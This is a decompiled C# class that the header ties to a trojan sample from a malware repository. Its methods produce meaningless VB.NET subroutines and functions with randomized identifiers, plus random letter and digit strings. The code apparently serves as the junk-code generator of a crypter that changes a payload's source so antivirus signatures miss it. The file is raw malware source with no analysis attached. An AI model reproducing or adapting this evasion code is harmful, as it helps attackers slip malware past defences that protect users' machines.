// Decompiled with JetBrains decompiler
// Type: NjStNGzRRE
// Assembly: tmp2E40.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8EEE8E37-EB17-405E-9B11-34066CAFB67D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-76851a57710cb206de65e017f3e988a3d2970667a297a6b3068a22fc12b9dc81.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;

public class NjStNGzRRE
{
  private int Tip;
  private int Koliko;

  public NjStNGzRRE(int Type, int Kolikox)
  {
    this.Tip = Type;
    this.Koliko = Kolikox;
  }

  public string IkakVponEY()
  {
    string str = string.Empty;
    int koliko = this.Koliko;
    int num = 0;
    while (num <= koliko)
    {
      str = this.Tip != 1 ? str + this.vCarFcbLxm(Conversions.ToString(num)) + "\r\n" : str + this.FBlUzyIreT(Conversions.ToString(num)) + "\r\n";
      checked { ++num; }
    }
    return str;
  }

  public string vCarFcbLxm(string name)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Append("\r\n    Public Sub var1" + name + "(ByVal var2 As String, ByVal var3 As String, ByVal var4 As String)");
    stringBuilder.Append("\r\n        Dim var5 As String() = {\"var1\", \"var2\", \"var3\", \"var4\", \"var5\"}");
    stringBuilder.Append("\r\n        For Each var6 As String In var5");
    stringBuilder.Append("\r\n            Do Until var5(0) = var2");
    stringBuilder.Append("\r\n                var3 = var4 & var2");
    stringBuilder.Append("\r\n                If var4.Contains(var5(2)) = True Then");
    stringBuilder.Append("\r\n                    var6 = var4.Length - 1");
    stringBuilder.Append("\r\n                    While var3.Length = 2");
    stringBuilder.Append("\r\n                        Do While var2.Contains(var5(1))");
    stringBuilder.Append("\r\n                            Exit Sub");
    stringBuilder.Append("\r\n                        Loop");
    stringBuilder.Append("\r\n                    End While");
    stringBuilder.Append("\r\n                End If");
    stringBuilder.Append("\r\n            Loop");
    stringBuilder.Append("\r\n        Next");
    stringBuilder.Append("\r\n    End Sub");
    string str = stringBuilder.ToString();
    string[] strArray = new string[6]
    {
      "var1",
      "var2",
      "var3",
      "var4",
      "var5",
      "var6"
    };
    VBMath.Randomize();
    int num = checked (strArray.Length - 1);
    int index = 0;
    while (index <= num)
    {
      str = str.Replace(strArray[index], this.A(5) + name);
      checked { ++index; }
    }
    VBMath.Randomize();
    return str;
  }

  public string FBlUzyIreT(string name)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Append("\r\n    Public Function var1" + name + "(ByVal var2 As String, ByVal var3 As String, ByVal var4 As String) As String");
    stringBuilder.Append("\r\n        Dim var5 As String() = {\"var1\", \"var2\", \"var3\", \"var4\", \"var5\"}");
    stringBuilder.Append("\r\n        For Each var6 As String In var5");
    stringBuilder.Append("\r\n            Do Until var5(0) = var2");
    stringBuilder.Append("\r\n                var3 = var4 & var2");
    stringBuilder.Append("\r\n                If var4.Contains(var5(2)) = True Then");
    stringBuilder.Append("\r\n                    var6 = var4.Length - 1");
    stringBuilder.Append("\r\n                    While var3.Length = 2");
    stringBuilder.Append("\r\n                        Do While var2.Contains(var5(1))");
    stringBuilder.Append("\r\n                            Return var2");
    stringBuilder.Append("\r\n                            Exit Function");
    stringBuilder.Append("\r\n                        Loop");
    stringBuilder.Append("\r\n                    End While");
    stringBuilder.Append("\r\n                End If");
    stringBuilder.Append("\r\n            Loop");
    stringBuilder.Append("\r\n            Return var2");
    stringBuilder.Append("\r\n        Next");
    stringBuilder.Append("\r\n    End Function");
    string str = stringBuilder.ToString();
    string[] strArray = new string[6]
    {
      "var1",
      "var2",
      "var3",
      "var4",
      "var5",
      "var6"
    };
    VBMath.Randomize();
    int num = checked (strArray.Length - 1);
    int index = 0;
    while (index <= num)
    {
      str = str.Replace(strArray[index], this.A(5) + name);
      checked { ++index; }
    }
    VBMath.Randomize();
    return str;
  }

  public string A(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }

  public string AB(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "1234567890".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
